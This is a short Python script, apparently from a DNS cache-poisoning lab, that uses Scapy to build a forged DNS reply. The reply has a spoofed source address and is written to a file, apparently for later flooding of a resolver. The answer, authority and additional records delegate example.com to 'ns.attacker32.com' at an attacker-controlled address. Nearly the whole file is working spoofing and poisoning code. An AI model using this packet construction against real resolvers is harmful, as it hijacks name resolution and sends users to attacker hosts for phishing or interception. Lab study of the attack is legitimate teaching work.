#!/usr/bin/env python3
import sys
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR

name = "twysw.example.com"
domain = "example.com"
ns = "ns.attacker32.com"
ns_ip = "10.2.6.153"

src_ns_ip = sys.argv[1] if len(sys.argv) > 1 else "108.162.192.162"
out_file = sys.argv[2] if len(sys.argv) > 2 else "ip_resp.bin"

Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type="A", rdata="1.2.3.4", ttl=259200)
NSsec = DNSRR(rrname=domain, type="NS", rdata=ns, ttl=259200)
Addsec = DNSRR(rrname=ns, type="A", rdata=ns_ip, ttl=259200)
dns = DNS(
    id=0xAAAA,
    aa=1,
    rd=1,
    qr=1,
    qdcount=1,
    ancount=1,
    nscount=1,
    arcount=1,
    qd=Qdsec,
    an=Anssec,
    ns=NSsec,
    ar=Addsec,
)

ip = IP(dst="10.2.6.53", src=src_ns_ip)
udp = UDP(dport=44444, sport=53, chksum=0)

pkt = ip / udp / dns
with open(out_file, "wb") as f:
    f.write(bytes(pkt))

print(f"Created {out_file} successfully (Spoofed Source IP: {src_ns_ip}).")
